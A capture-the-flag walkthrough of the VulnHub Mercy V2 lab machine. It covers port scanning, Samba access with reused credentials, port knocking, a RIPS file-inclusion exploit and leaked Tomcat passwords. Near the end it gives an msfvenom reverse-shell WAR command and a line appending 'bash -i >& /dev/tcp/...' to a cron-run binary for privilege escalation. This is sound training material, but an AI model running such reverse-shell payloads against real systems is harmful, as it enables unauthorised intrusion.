---
description: https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/
---

# Mercy V2

## Enumeration

```bash
nmap -A -p- -sC -sV -v 192.168.11.166
```

{% code overflow="wrap" %}
```
Nmap scan report for 192.168.11.166
Host is up (0.00074s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3?
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL TOP PIPELINING AUTH-RESP-CODE SASL RESP-CODES STLS CAPA
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114:fd64:1d28:7465:e1c8:8fde:af46:c767
|_SHA-1: b1d2:b496:ab16:ed59:df4e:396e:6aa4:94df:e59f:c991
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd
|_imap-capabilities: STARTTLS more IDLE capabilities LITERAL+ have LOGIN-REFERRALS Pre-login OK SASL-IR IMAP4rev1 post-login LOGINDISABLEDA0001 listed ID ENABLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114:fd64:1d28:7465:e1c8:8fde:af46:c767
|_SHA-1: b1d2:b496:ab16:ed59:df4e:396e:6aa4:94df:e59f:c991
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114:fd64:1d28:7465:e1c8:8fde:af46:c767
|_SHA-1: b1d2:b496:ab16:ed59:df4e:396e:6aa4:94df:e59f:c991
|_imap-capabilities: more IDLE capabilities LITERAL+ have LOGIN-REFERRALS post-login OK SASL-IR IMAP4rev1 AUTH=PLAINA0001 Pre-login listed ID ENABLE
995/tcp  open     ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114:fd64:1d28:7465:e1c8:8fde:af46:c767
|_SHA-1: b1d2:b496:ab16:ed59:df4e:396e:6aa4:94df:e59f:c991
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL TOP PIPELINING AUTH-RESP-CODE SASL(PLAIN) RESP-CODES USER CAPA
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-title: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
MAC Address: 00:0C:29:B7:A9:AF (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.003 days (since Tue Jan 30 12:14:47 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-01-30T17:19:28
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   MERCY<00>            Flags: <unique><active>
|   MERCY<03>            Flags: <unique><active>
|   MERCY<20>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2024-01-31T01:19:28+08:00
|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: -1s

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.11.166

NSE: Script Post-scanning.
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.22 seconds
           Raw packets sent: 65601 (2.887MB) | Rcvd: 65550 (2.623MB)

```
{% endcode %}

### Port 445/139 Samba

Try anonymous access to Samba share:

```bash
smbmap -u "" -p "" -H 192.168.11.166
```

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

Same result for port 139:

```
crackmapexec smb mercy -u '' -p '' --shares --port 139
```

<figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

I do have a credential from a previous box in the series.

* **Username:** `qiu`
* **Password:** `password`

```
smbmap -u "qiu" -p "password" -H mercy 
```

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Connect to share `qiu`:

```
smbclient //192.168.11.166/qiu -U qiu%password
```

<figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

From .private directory, get `config` and `configprint` files:

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

In the file `config` we can see the configuration of Knocking Daemon:

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

We will"knock" on ports for enable HTTP:80...

### Port 80

To open the port 80 to HTTP traffic, after knowing the sequence from Samba enumeration, use this command:

```bash
knock -v 192.168.11.166 159 27391 4 
```

<figure><img src="../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

From this situation:

<figure><img src="../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

After knocking to this one:

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

Enumerate some directories or files using gobuster:

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

time

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

login.html:

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

robots.txt:

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

Going to /nomercy:

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

RIPS is a static code analysis software, designed for automated detection of security vulnerabilities in PHP and Java applications. This version seems to be vulnerable:

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

Obtain the exploit:

```
searchsploit -m php/webapps/18660.txt
```

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

We can extract some users:

```
pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
fluffy:x:1003:1003::/home/fluffy:/bin/sh 
```

We can also see the Tomcat configuration as indicated on default:

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

```
<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 
```

### Port 8080

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/tomcat.txt -u http://mercy.local:8080/FUZZ -fc 401
```

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Using grabbed credentials:&#x20;

`username: thisisasuperduperlonguser`

`password: heartbreakisinevitable`&#x20;

We can access the Tomcat Web Application Manager:

<figure><img src="../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

Now we can use metasploit to obtain a reverse shell by uploading an evil WAR:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.11.128 LPORT=4444 -f war -o shell.war
```

Start a netcat listener on TCP 4444, click the `/shell` link and catch the reverse shell:

<figure><img src="../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

And upgrade it to a pseudo-shell:

```
python -c 'import pty;pty.spawn("/bin/bash")';
```

### Change user to fluffy

The user fluffy is the only that seems to work with `su`:

username: `fluffy`&#x20;

password: `freakishfluffybunny`

<figure><img src="../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

Under the path `/.private/secrets` we see the file `timeclock` that seems to be the same binary used to report the time on web page as seen before:

<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

With the following command we add to timeclock the reverse shell payload and wait 3 minutes for the next run.&#x20;

```
echo "bash -i >& /dev/tcp/192.168.11.128/9000 0>&1" >> timeclock
```

<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>
